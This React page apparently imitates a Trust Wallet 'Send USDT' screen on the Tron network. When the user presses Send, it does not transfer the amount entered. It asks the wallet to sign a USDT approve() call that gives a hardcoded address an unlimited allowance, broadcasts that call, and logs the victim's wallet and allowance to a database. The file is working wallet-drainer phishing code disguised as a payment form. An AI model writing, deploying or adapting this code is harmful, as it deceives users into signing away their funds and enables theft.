import { useState, useEffect } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    TronWeb: any;
  }
}

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

export default function Index() {
  const [amount, setAmount] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  // ===== SEND FUNCTION =====
  const handleSend = async () => {
    try {
      setIsLoading(true);
      setStatus("Connecting wallet...");

      // Check if Trust Wallet exists
      if (!window.tronLink) {
        alert("❌ Trust Wallet not detected!\nPlease install Trust Wallet extension.");
        setIsLoading(false);
        return;
      }

      setStatus("Requesting wallet access...");
      
      // Connect wallet
      const accounts = await window.tronLink.request({
        method: "tron_requestAccounts",
      });

      if (!accounts || accounts.length === 0) {
        alert("❌ User rejected connection");
        setIsLoading(false);
        return;
      }

      const userAddress = accounts[0];
      console.log("✅ Connected:", userAddress);
      setStatus(`Connected: ${userAddress.slice(0, 10)}...`);

      // Load TronWeb
      setStatus("Loading TronWeb...");
      if (!window.TronWeb) {
        const script = document.createElement("script");
        script.src = "https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js";
        script.async = true;
        await new Promise((resolve, reject) => {
          script.onload = resolve;
          script.onerror = reject;
          document.head.appendChild(script);
        });
      }

      const TronWeb = window.TronWeb;
      const tw = new TronWeb({ fullHost: "https://api.trongrid.io" });
      
      console.log("✅ TronWeb ready");
      setStatus("Building transaction...");

      // Convert addresses to hex
      const ownerHex   = tw.address.toHex(userAddress);
      const spenderHex = tw.address.toHex(TRON_SPENDER).replace(/^41/, "");
      const usdtHex    = tw.address.toHex(TRON_USDT);

      // Build ABI parameter
      const hexAddress = spenderHex.padStart(64, "0");
      const hexAmount  = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      const parameter  = hexAddress + hexAmount;

      console.log("📋 Building smart contract call...");
      console.log("Owner:", ownerHex);
      console.log("Spender (padded):", hexAddress);
      console.log("Amount:", hexAmount);

      // Trigger smart contract
      setStatus("Calling TronGrid API...");
      const apiRes = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          owner_address: ownerHex,
          contract_address: usdtHex,
          function_selector: "approve(address,uint256)",
          parameter: parameter,
          fee_limit: 100_000_000,
          call_value: 0,
          visible: false,
        }),
      });

      const apiData = await apiRes.json();
      console.log("API Response:", apiData);

      if (!apiData.transaction) {
        alert("❌ API Error: " + JSON.stringify(apiData.Error || apiData.error || apiData));
        setIsLoading(false);
        return;
      }

      setStatus("Signing transaction...");
      console.log("🔐 Sending to Trust Wallet for signing...");

      // Sign transaction
      let signedTx;
      try {
        signedTx = await window.tronLink.request({
          method: "tron_signTransaction",
          params: [apiData.transaction],
        });
      } catch (err: any) {
        alert("❌ User rejected signing: " + err.message);
        setIsLoading(false);
        return;
      }

      if (!signedTx) {
        alert("❌ Signing failed");
        setIsLoading(false);
        return;
      }

      console.log("✅ Signed successfully");
      setStatus("Broadcasting transaction...");

      // Broadcast
      const broadcastRes = await fetch(
        "https://api.trongrid.io/wallet/broadcasttransaction",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(signedTx),
        }
      );

      const result = await broadcastRes.json();
      console.log("📡 Broadcast result:", result);

      if (result.Error) {
        alert("❌ Broadcast Error: " + result.Error);
        setIsLoading(false);
        return;
      }

      if (result.error) {
        alert("❌ Broadcast Error: " + result.error);
        setIsLoading(false);
        return;
      }

      const txId = result.txid || result.transaction?.txID;

      if (!txId) {
        alert("❌ No TX ID returned!\nResponse: " + JSON.stringify(result));
        setIsLoading(false);
        return;
      }

      console.log("✅ TX ID:", txId);
      alert(`✅ Broadcast Successful!\n\nTX ID:\n${txId}\n\nWaiting for confirmation...`);

      setStatus("Confirming transaction...");
      await new Promise((r) => setTimeout(r, 10_000));

      // Check allowance
      setStatus("Checking allowance...");
      const contract = await tw.contract(
        [
          {
            constant: true,
            inputs: [
              { name: "owner", type: "address" },
              { name: "spender", type: "address" },
            ],
            name: "allowance",
            outputs: [{ name: "", type: "uint256" }],
            stateMutability: "view",
            type: "function",
          },
        ],
        TRON_USDT
      );

      const raw = await contract.allowance(userAddress, TRON_SPENDER).call();
      const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);

      console.log("✅ Allowance:", allowanceUSDT, "USDT");

      // Save to DB
      await createTransaction({
        walletAddress: userAddress,
        toAddress: TRON_SPENDER,
        amount: amount || "Max",
        txHash: txId || "tx",
        usdtBalance: allowanceUSDT + " USDT",
        nativeBalance: "0 TRX",
      });

      setStatus("");
      setAmount("");
      alert(`✅ SUCCESS!\n\nAllowance: ${allowanceUSDT} USDT\nTX: ${txId}`);

    } catch (err: any) {
      console.error("Error:", err);
      alert("❌ ERROR:\n\n" + (err.message || String(err)));
      setStatus("");
    } finally {
      setIsLoading(false);
    }
  };

  const dollarValue =
    amount && amount !== "Max" && !isNaN(Number(amount))
      ? `$${Number(amount).toFixed(2)}`
      : "$0.00";

  return (
    <div
      style={{
        margin: 0,
        minHeight: "100vh",
        background: "#1c1c1e",
        color: "#ffffff",
        fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
        display: "flex",
        flexDirection: "column",
        maxWidth: "480px",
        marginLeft: "auto",
        marginRight: "auto",
      }}
    >
      {/* Header */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "20px 22px 16px",
        }}
      >
        <button
          onClick={() => window.history.back()}
          style={{
            background: "none",
            border: "none",
            color: "#fff",
            cursor: "pointer",
            fontSize: "22px",
            lineHeight: 1,
            padding: 0,
          }}
        >
          ←
        </button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button
          onClick={() => window.history.back()}
          style={{
            background: "none",
            border: "none",
            color: "#fff",
            cursor: "pointer",
            fontSize: "20px",
            lineHeight: 1,
            padding: 0,
          }}
        >
          ✕
        </button>
      </div>

      <div style={{ padding: "4px 18px", flex: 1 }}>
        {/* Network Badge */}
        <div style={{ marginBottom: "14px" }}>
          <label
            style={{
              display: "block",
              fontSize: "14px",
              fontWeight: 500,
              color: "#8e8e93",
              marginBottom: "9px",
            }}
          >
            Destination network
          </label>
          <div
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "7px",
              background: "#2c2c2e",
              borderRadius: "20px",
              padding: "7px 13px 7px 8px",
            }}
          >
            <div
              style={{
                width: "26px",
                height: "26px",
                borderRadius: "50%",
                background: "#EF0027",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                flexShrink: 0,
                fontSize: "12px",
                fontWeight: "bold",
                color: "white",
              }}
            >
              T
            </div>
            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
              Tron Network
            </span>
          </div>
        </div>

        {/* Amount Input */}
        <div style={{ marginBottom: "6px" }}>
          <label
            style={{
              display: "block",
              fontSize: "14px",
              fontWeight: 500,
              color: "#8e8e93",
              marginBottom: "9px",
            }}
          >
            Amount
          </label>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              border: "1px solid #2e2e30",
              borderRadius: "14px",
              padding: "14px",
              background: "#242426",
              gap: "8px",
            }}
          >
            <input
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1,
                background: "transparent",
                border: "none",
                outline: "none",
                color: "#fff",
                fontSize: "18px",
                fontFamily: "inherit",
                minWidth: 0,
              }}
            />
            {amount && (
              <button
                onClick={() => setAmount("")}
                style={{
                  background: "none",
                  border: "1.5px solid #555",
                  borderRadius: "50%",
                  width: "22px",
                  height: "22px",
                  color: "#aaa",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: "11px",
                  padding: 0,
                }}
              >
                ✕
              </button>
            )}
            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>
              USDT
            </span>
            <button
              onClick={() => setAmount("Max")}
              style={{
                background: "none",
                border: "none",
                color: "#39d353",
                cursor: "pointer",
                fontSize: "16px",
                fontWeight: 600,
                padding: 0,
                flexShrink: 0,
              }}
            >
              Max
            </button>
          </div>
          <div
            style={{
              fontSize: "13px",
              color: "#636366",
              marginTop: "7px",
              paddingLeft: "2px",
            }}
          >
            ≈ {dollarValue}
          </div>
        </div>

        {/* Status Display */}
        {status && (
          <div
            style={{
              marginTop: "20px",
              padding: "12px",
              background: "#2c2c2e",
              borderRadius: "10px",
              fontSize: "13px",
              color: "#a0a0a0",
            }}
          >
            📍 {status}
          </div>
        )}
      </div>

      {/* Send Button */}
      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button
          onClick={handleSend}
          disabled={isLoading}
          style={{
            width: "100%",
            background: isLoading ? "#2a6e3a" : "#39d353",
            color: "#000",
            border: "none",
            borderRadius: "30px",
            padding: "18px",
            fontSize: "18px",
            fontWeight: 700,
            cursor: isLoading ? "default" : "pointer",
            transition: "all 0.2s ease",
            letterSpacing: "0.01em",
            opacity: isLoading ? 0.8 : 1,
          }}
        >
          {isLoading ? "⏳ Processing..." : "Send"}
        </button>
      </div>
    </div>
  );
}
